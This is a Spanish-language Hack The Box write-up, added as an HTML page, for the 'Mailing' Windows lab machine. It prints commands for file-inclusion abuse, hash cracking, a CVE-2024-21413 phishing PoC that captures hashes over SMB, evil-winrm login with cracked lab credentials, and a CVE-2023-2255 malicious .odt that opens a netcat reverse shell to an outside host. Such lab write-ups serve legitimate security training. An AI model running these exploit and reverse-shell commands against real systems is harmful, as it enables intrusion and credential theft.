@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Mailing HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/mailing/pasted-20260331014346.png" alt="Mailing HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Mailing</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>auxrecon</span>
+            <span>aplicaciones</span>
+            <span>lfi</span>
+            <span>hmailserver</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Aplicación web con LFI</li>
+            <li><code>Explotación</code>: LFI permite leer configuración de hMailServer</li>
+            <li><code>Movimiento lateral</code>: Exploit de hMailServer envía credenciales y permite acceso como usuario</li>
+            <li><code>Escalada de Privilegios</code>: Aplicación vulnerable <code>auxrecon</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260331014423.png" alt="Mailing HTB" />
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260331134828.png" alt="Mailing HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: LFI</h2>
+          <div class="code-card">
+            <h3>Vemos que es posible LFI</h3>
+            <pre><code># URL_ http://mailing.htb/download.php?file=...</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260316213136.png" alt="Mailing HTB" />
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260331015818.png" alt="Mailing HTB" />
+          <div class="code-card">
+            <h3>Enumerar posibles usuarios del pdf</h3>
+            <pre><code># Usuario: Maya</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260316232822.png" alt="Mailing HTB" />
+          <div class="code-card">
+            <h3>Buscar ruta de configuración de hmailserver</h3>
+            <pre><code># Contraseña del serivcio hMailServer: 841bb5acfa6779ae432fd7a4e6600ba7</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260316232733.png" alt="Mailing HTB" />
+          <div class="code-card">
+            <h3>Crackear Hash aparentemente MD5</h3>
+            <pre><code>john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Contraseña: homenetworkingadministrator</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Buscar Vulnerabilidades de hMailServer</h3>
+            <pre><code># Google: hMailSerever Vulnerabilidades -&gt; CVE-2024-21413</code></pre>
+          </div>
+          <p><a href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git">PoC GitHub</a></p>
+          <div class="code-card">
+            <h3>PoC</h3>
+            <pre><code>git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git
+
+python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password "homenetworkingadministrator" --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.69\SMB\test.txt" --subject "Pincha Porfa" 
+
+# Listener
+impacket-smbserver SMB $(pwd) -smb2support -debug</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260331135159.png" alt="Mailing HTB" />
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260331135209.png" alt="Mailing HTB" />
+          <div class="code-card">
+            <h3>Crackear Hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Credenciales -&gt; maya:m4y4ngs4ri</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260331135341.png" alt="Mailing HTB" />
+          <div class="code-card">
+            <h3>Acceso WINRM</h3>
+            <pre><code>evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260316235308.png" alt="Mailing HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Aplicaciones</h2>
+          <div class="code-card">
+            <h3>Enumerar Directorios Claves</h3>
+            <pre><code># Suponer que ese directorio será revisado
+# C:/Important Document/</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260401004802.png" alt="Mailing HTB" />
+          <div class="code-card">
+            <h3>Enumerar programas</h3>
+            <pre><code>. ./recon.ps1
+recon.programs</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260331135914.png" alt="Mailing HTB" />
+          <div class="code-card">
+            <h3>Buscar Versión</h3>
+            <pre><code># C:\Program Files\LibreOffice\readmes
+type readme_es.txt</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260401001501.png" alt="Mailing HTB" />
+          <p><a href="https://github.com/elweth-sec/CVE-2023-2255">PoC GitHub</a></p>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260401004644.png" alt="Mailing HTB" />
+          <div class="code-card">
+            <h3>PoC GitHub</h3>
+            <pre><code># Crear binario .odt que al descomprimirlo en la máquina ejecuta en comando que especifiquemos
+python3 CVE-2023-2255.py --cmd 'C:/windows/temp/prives/nc.exe 10.10.16.69 443 -e cmd.exe' --output 'exploit.odt'</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260401005308.png" alt="Mailing HTB" />
+          <div class="code-card">
+            <h3>Reverse shell</h3>
+            <pre><code># Subir exploit.odt a Important Documents
+# Subir nc.exe a /windows/temp/prives
+# Listener
+penelope -p 443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/mailing/pasted-20260401005205.png" alt="Mailing HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>auxrecon</span>
+            <span>aplicaciones</span>
+            <span>lfi</span>
+            <span>hmailserver</span>
+            <span>LibreOffice</span>
+            <span>smtp</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
